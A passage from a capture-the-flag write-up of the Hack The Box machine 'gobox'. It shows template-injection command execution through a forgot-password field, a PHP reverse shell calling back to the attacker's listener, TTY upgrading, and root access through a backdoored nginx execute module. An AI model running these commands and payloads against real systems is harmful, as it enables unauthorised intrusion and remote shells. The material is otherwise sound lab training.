$ curl -s -X POST -H 'Host: 10.10.11.113:8080' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.113:8080/forgot/ --data-binary 'email={{.DebugCmd "aws s3 cp /tmp/shell s3://website/rev.php"}}'
..
..
upload: ../../tmp/shell to s3://website/rev.php                 B/s) with 1 file(s) remaining
```

We got a shell!!!

![](Pasted%20image%2020231021124113.png)

![](Pasted%20image%2020231021124149.png)

## User flag

![](Pasted%20image%2020231021124226.png)

Let's configure our better php reverse shell and spawn a Python web server:

```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
..
..
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.7';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
..
..
```



```bash
joshua@kaligra:~/Documents/htb/machines/gobox$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...

```

![](Pasted%20image%2020231021124606.png)

```bash
joshua@kaligra:~/Documents/htb/machines/gobox$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
10.10.11.113 - - [21/Oct/2023 12:44:49] "GET /rev2.php HTTP/1.1" 200 -
```

```bash
joshua@kaligra:~/Documents/htb/machines/gobox$ nc -nvlp 4444
listening on [any] 4444 ...
```

```bash
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.113] 50398
Linux gobox 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 10:46:39 up  2:22,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
$
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

Classic stuff:

```bash
$ which python
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@gobox:/$ ^Z
[1]+  Stopped                 nc -nvlp 4444
joshua@kaligra:~/Documents/htb/machines/gobox$ stty raw -echo
joshua@kaligra:~/Documents/htb/machines/gobox$
nc -nvlp 4444

www-data@gobox:/$
www-data@gobox:/$
www-data@gobox:/$
```


## privilege escalation

### local network connections

```bash
www-data@gobox:~$ netstat -natlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      2 10.10.11.113:50398      10.10.14.7:4444         ESTABLISHED 6299/sh
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::9000                 :::*                    LISTEN      -
tcp6       0      0 :::9001                 :::*                    LISTEN      -
```

So far we got additional TCP ports (if compared to previous `nmap`'s scan)

```
8000
9000
9001
```

```bash
www-data@gobox:~$ cd /etc/apache2/
www-data@gobox:/etc/apache2$ ls
conf-available
www-data@gobox:/etc/apache2$ grep -rl 9001 *
www-data@gobox:/etc/apache2$ cd ..
www-data@gobox:/etc$ cd ..
www-data@gobox:/$ cd etc/nginx/
www-data@gobox:/etc/nginx$ grep -rl 9001 *
sites-available/default
```

```bash
# Default server configuration
#
server {
        listen 4566 default_server;


        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;


        location / {
                if ($http_authorization !~ "(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)") {
                    return 403;
                }
                proxy_pass http://127.0.0.1:9000;
        }

}

server {
        listen 80;
        root /opt/website;
        index index.php;

        location ~ [^/]\.php(/|$) {
            fastcgi_index index.php;
            fastcgi_param REQUEST_METHOD $request_method;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param QUERY_STRING $query_string;


            fastcgi_pass unix:/tmp/php-fpm.sock;
        }
}

server {
        listen 8080;
        add_header X-Forwarded-Server golang;
        location / {
                proxy_pass http://127.0.0.1:9001;
        }
}

server {
        listen 127.0.0.1:8000;
        location / {
                command on;
        }
}
www-data@gobox:/etc/nginx/sites-available$
```


If we look closely at nginx's configuration, we noticed the directive "`command on;`"

It is referring to this module:

https://nginx-extras.getpagespeed.com/modules/execute/

Let's try:

```bash
$ curl http://127.0.0.1:8000/?system.run[id]
curl: (52) Empty reply from server
```

No luck.

Let's inspect the relevant module:

```bash
www-data@gobox:/usr/share/nginx/modules$ grep "system.run" ngx_http_execute_module.so
www-data@gobox:/usr/share/nginx/modules$
www-data@gobox:/usr/share/nginx/modules$ grep ".run" ngx_http_execute_module.so
Binary file ngx_http_execute_module.so matches
www-data@gobox:/usr/share/nginx/modules$ strings ngx_http_execute_module.so  |grep ".run"
ippsec.run
```

So we need to change our command a bit:

```bash
$ curl http://127.0.0.1:8000/?ippsec.run[id]
uid=0(root) gid=0(root) groups=0(root)
```

## root flag

```bash
www-data@gobox:/usr/share/nginx/modules$ curl -g http://127.0.0.1:8000/?ippsec.run["cat /root/root.txt"]
27bc55574XXXXXXXXXXXXXXX
```



## Notes

`man curl`

```bash
 -g, --globoff
              This option switches off the "URL globbing parser". When you set this option, you can specify URLs that contain the letters {}[] without having curl itself interpret them.
              Note that these letters are not normal legal URL contents but they should be encoded according to the URI standard.

              Providing -g, --globoff multiple times has no extra effect.  Disable it again with --no-globoff.

              Example:
               curl -g "https://example.com/{[]}}}}"
```

`stty`

To get your current settings:

```bash
joshua@kaligra:~$ stty -a
speed 38400 baud; rows 46; columns 190; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O;
min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
```

To modify your settings:

```
stty rows 46 columns 190
```

